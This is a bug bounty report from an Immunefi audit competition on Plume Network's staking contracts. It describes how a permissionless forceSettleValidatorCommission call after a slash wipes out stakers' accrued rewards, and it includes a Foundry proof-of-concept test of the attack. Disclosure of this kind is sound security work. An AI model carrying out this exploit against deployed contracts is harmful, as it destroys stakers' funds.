# 52780 sc high timestamp manipulation in forcesettlevalidatorcommission leads to permanent loss of staker rewards

**Submitted on Aug 13th 2025 at 05:10:23 UTC by @ZeroExRes for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #52780
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/ValidatorFacet.sol>
* **Impacts:** Theft of unclaimed yield

## Description

### Brief/Intro

An attacker can maliciously advance `validatorLastUpdateTimes` past the `slashedAtTimestamp` by calling the permissionless `forceSettleValidatorCommission` function after a validator is slashed, causing all stakers of the slashed validator to permanently lose accrued rewards between the last update and the slash event. This results in silent, irreversible fund loss proportional to the time gap between the last reward update and the slashing event.

### Vulnerability Details

The vulnerability exists in the interaction between `forceSettleValidatorCommission` and `calculateRewardsWithCheckpoints` functions. When a validator is slashed, `updateRewardPerTokenForValidator` unconditionally advances `validatorLastUpdateTimes` to the current timestamp, even if it exceeds the `slashedAtTimestamp`:

```solidity
// In updateRewardPerTokenForValidator
if (validator.slashed) {
    //  This advances timestamp beyond slashedAtTimestamp
    $.validatorLastUpdateTimes[validatorId][token] = block.timestamp;
}
```

This breaks the reward calculation logic in `calculateRewardsWithCheckpoints`:

```solidity
uint256 effectiveEndTime = validator.slashedAtTimestamp; // T1 (slash time)
uint256 validatorLastUpdateTime = $.validatorLastUpdateTimes[validatorId][token]; // T2 (after attack)

if (effectiveEndTime > validatorLastUpdateTime) { // T1 > T2 becomes FALSE
    // This critical reward calculation block is SKIPPED
    uint256 timeSinceLastUpdate = effectiveEndTime - validatorLastUpdateTime;
    // ... missing reward calculation for period T0 → T1
}
```

{% stepper %}
{% step %}

### Attack flow — Step 1

Validator has `validatorLastUpdateTimes = T0`
{% endstep %}

{% step %}

### Attack flow — Step 2

Validator gets slashed at `slashedAtTimestamp = T1` (where T1 > T0)
{% endstep %}

{% step %}

### Attack flow — Step 3

Attacker calls `forceSettleValidatorCommission(validatorId)` at time T2 (where T2 > T1)
{% endstep %}

{% step %}

### Attack flow — Step 4

`validatorLastUpdateTimes` gets set to T2, breaking the condition `T1 > T2`
{% endstep %}

{% step %}

### Attack flow — Step 5

Reward calculation for period T0→T1 is permanently skipped
{% endstep %}
{% endstepper %}

### Impact Details

Complete loss of rewards for all stakers of the slashed validator for the period between last update and slash.

### References

Mentioned above

## Proof of Concept

Add to PlumeStakingDiamond.t.sol

```solidity
function testSlashedValidatorRewardLoss_ForceSettleAttack() public {    
    // Setup validators using the established pattern
    testSlash_Setup();
    
    // Setup reward rate for PLUME_NATIVE
    uint256 rewardRate = 1e15; // 0.001 PLUME per second
    vm.startPrank(admin);
    address[] memory tokens = new address[](1);
    tokens[0] = PLUME_NATIVE;
    uint256[] memory rates = new uint256[](1);
    rates[0] = rewardRate;
    RewardsFacet(address(diamondProxy)).setRewardRates(tokens, rates);
    
    // Set max slash vote duration
    ManagementFacet(address(diamondProxy)).setMaxSlashVoteDuration(1 days);
    vm.stopPrank();

    // Create test users and give them ETH
    address victimUser = makeAddr("victimUser");
    vm.deal(victimUser, 100 ether);

    // Target validator to slash (validator 2 from setup)
    uint16 targetValidatorId = 2;
    
    // Victim user stakes with the target validator
    uint256 stakeAmount = 50 ether;
    vm.startPrank(victimUser);
    StakingFacet(address(diamondProxy)).stake{value: stakeAmount}(targetValidatorId);
    uint256 stakeTimestamp = block.timestamp;
    vm.stopPrank();

    // Advance time to accrue rewards (10 seconds)
    uint256 timeBeforeSlash = 10;
    vm.warp(stakeTimestamp + timeBeforeSlash);
    
    // Calculate expected rewards for the period
    uint256 expectedGrossRewards = (stakeAmount * rewardRate * timeBeforeSlash) / 1e18;
    // Subtract 8% commission (validator 2 has 8e16 commission from setup)
    uint256 expectedNetRewards = expectedGrossRewards - (expectedGrossRewards * 8e16) / 1e18;
    
    console2.log("Expected net rewards for 10 seconds:", expectedNetRewards);
    
    // Vote to slash the target validator
    uint256 voteExpiration = block.timestamp + 1 hours;
    
    // Vote from validator 0 (admin: validatorAdmin)
    vm.startPrank(validatorAdmin);
    ValidatorFacet(address(diamondProxy)).voteToSlashValidator(
        targetValidatorId,
        voteExpiration
    );
    vm.stopPrank();
    
    // Vote from validator 1 (admin: user2)
    vm.startPrank(user2);
    ValidatorFacet(address(diamondProxy)).voteToSlashValidator(
        targetValidatorId,
        voteExpiration
    );
    vm.stopPrank();
    
    uint256 slashTimestamp = block.timestamp;
    console2.log("Validator slashed at timestamp:", slashTimestamp);
    
    // Verify validator is slashed
    (PlumeStakingStorage.ValidatorInfo memory validatorInfo,,) = 
        ValidatorFacet(address(diamondProxy)).getValidatorInfo(targetValidatorId);
    assertTrue(validatorInfo.slashed, "Validator should be slashed");
    assertEq(validatorInfo.slashedAtTimestamp, slashTimestamp, "Slash timestamp mismatch");
    
    // Check rewards before attack
    uint256 rewardsBeforeAttack = RewardsFacet(address(diamondProxy))
        .getClaimableReward(victimUser, PLUME_NATIVE);
    console2.log("Claimable rewards before attack:", rewardsBeforeAttack);
    
    // ATTACK: Call forceSettleValidatorCommission after slash
    // This advances validatorLastUpdateTimes past slashedAtTimestamp
    vm.warp(block.timestamp + 5); // Move forward to make the attack more obvious
    
    // Anyone can call this function - demonstrating the permissionless nature of the attack
    vm.prank(makeAddr("attacker"));
    ValidatorFacet(address(diamondProxy)).forceSettleValidatorCommission(targetValidatorId);
    console2.log("Attack executed: forceSettleValidatorCommission called at:", block.timestamp);
    
    // Check rewards after attack
    uint256 rewardsAfterAttack = RewardsFacet(address(diamondProxy))
        .getClaimableReward(victimUser, PLUME_NATIVE);
    console2.log("Claimable rewards after attack:", rewardsAfterAttack);
    
    // Try to claim and verify the loss
    vm.startPrank(victimUser);
    uint256 balanceBefore = victimUser.balance;
    uint256 claimedAmount = RewardsFacet(address(diamondProxy)).claim(PLUME_NATIVE);
    uint256 balanceAfter = victimUser.balance;
    vm.stopPrank();
    
    console2.log("Amount actually claimed:", claimedAmount);
    console2.log("Balance increase:", balanceAfter - balanceBefore);
    
    // Demonstrate the vulnerability
    console2.log("VULNERABILITY ANALYSIS:");
    console2.log("Expected rewards:", expectedNetRewards);
    console2.log("Actually claimed after attack:", claimedAmount);
    
    // Assert that there is a significant loss due to the vulnerability
    // The user should receive close to expectedNetRewards but due to the bug receives nothing
    assertEq(
        claimedAmount, 
        0, 
        "User should have lost significant rewards due to the vulnerability"
    );

}
```
